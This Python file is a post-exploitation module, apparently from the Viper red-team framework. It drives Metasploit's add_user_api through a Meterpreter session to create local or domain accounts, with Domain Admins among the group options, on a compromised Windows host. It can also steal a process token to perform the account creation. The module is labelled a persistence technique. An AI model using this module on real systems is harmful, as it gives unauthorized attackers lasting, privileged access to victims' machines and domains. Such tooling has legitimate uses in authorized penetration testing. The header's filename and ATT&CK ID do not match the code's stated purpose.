# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows增加本地账户/域账户"
    DESC_ZH = "通过Windows api增加本地用户/域用户.\n" \
              "可以选择steal_token功能窃取本地进程权限来执行创建用户操作."

    NAME_EN = "Windows add local account/domain account"
    DESC_EN = "Add local users/domain users through Windows api.\n" \
              "You can choose the steal_token function to steal local process permissions to perform user creation operations."

    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1004"]  # ATTCK向量
    AUTHOR = ["Viper"]
    README = ["https://www.yuque.com/vipersec/module/bf54r3"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1098/"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionStr(name='USERNAME',
                  tag_zh="用户名", desc_zh="账户的用户名,域用户无需填写域名",
                  tag_en="User",
                  desc_en="The user name of the account, domain users do not need to fill in the domain name",
                  required=True),
        OptionStr(name='PASSWORD',
                  tag_zh="密码", desc_zh="账户的密码,建议使用满足一定复杂度的密码",
                  tag_en="Password",
                  desc_en="The password of the account, it is recommended to use a password that meets a certain complexity",
                  required=True),
        OptionStr(name='GROUP', tag_zh="用户组", desc_zh="本地用户组: Users"
                                                      "本地管理员组: Administrators"
                                                      "域管理员组: Domain Admins"
                                                      "域用户组:Domain Users",
                  tag_en="Group", desc_en="Users"
                                          "Administrators"
                                          "Domain Admins"
                                          "Domain Users",
                  required=True),
        OptionBool(name="ADDTODOMAIN",
                   tag_zh="域用户",
                   desc_zh="选定则添加为域账户,未选定则添加为本地账户",
                   tag_en="Domain user",
                   desc_en="Selected to add as a domain account, unselected to add as a local account",
                   required=True,
                   ),
        OptionStr(name='TOKEN',
                  tag_zh="用户TOKEN", desc_zh="添加域用户时可将TOKEN设置为用户名或PID,模块会自动使用steal_token窃取token.",
                  tag_en="User TOKEN",
                  desc_en="When adding a domain user, you can set the TOKEN as the username or PID, and the module will automatically use steal_token to steal the token.", ),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/add_user_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        self.set_msf_option("ADDTODOMAIN", self.param("ADDTODOMAIN"))
        self.set_msf_option("USERNAME", self.param("USERNAME"))
        self.set_msf_option("PASSWORD", self.param("PASSWORD"))
        self.set_msf_option("GROUP", self.param("GROUP"))
        self.set_msf_option("TOKEN", self.param("TOKEN"))

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good("详细日志请查看右侧日志栏", "For detailed logs, please check the log column on the right")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
